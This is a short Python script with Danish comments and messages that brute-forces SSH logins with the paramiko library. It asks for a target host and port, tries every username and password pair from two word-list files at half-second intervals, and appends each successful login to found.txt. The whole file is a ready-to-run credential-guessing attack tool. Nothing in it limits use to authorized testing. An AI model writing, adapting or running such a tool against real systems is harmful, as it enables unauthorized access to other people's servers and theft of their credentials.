import paramiko
import socket
import time


DELAY = 0.5  # hvor mange sekunder mellem hvert loginforsøg


def brute_force_ssh(hostname, port, user, password):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"Tester {user}:{password}")
        ssh_client.connect(
            hostname,
            port=port,
            username=user,
            password=password,
            timeout=5,
            banner_timeout=5,
            auth_timeout=5
        )
        print(f"[SUCCESS] Login fundet: {user}:{password}")

        # Gemme til fil
        with open("found.txt", "a") as f:
            f.write(f"{user}:{password}\n")

    except paramiko.AuthenticationException:
        print(f"Fejl login: {user}:{password}")

    except (socket.error, paramiko.SSHException) as e:
        print(f"Netværksfejl: {str(e)}")

    finally:
        ssh_client.close()


def load_list(filename):
    """Loader en fil og fjerner linjeskift."""
    with open(filename, "r") as f:
        return [line.strip() for line in f.readlines()]


def main():
    hostname = input("Target hostname/IP: ").strip()
    port = int(input("Target port: ").strip())

    users = load_list("users.txt")
    passwords = load_list("passwords.txt")

    print(f"\nStarter brute-force mod {hostname}:{port}")
    print(f"Brugere: {len(users)} | Passwords: {len(passwords)}\n")

    for user in users:
        for password in passwords:
            brute_force_ssh(hostname, port, user, password)
            time.sleep(DELAY)


if __name__ == "__main__":
    main()
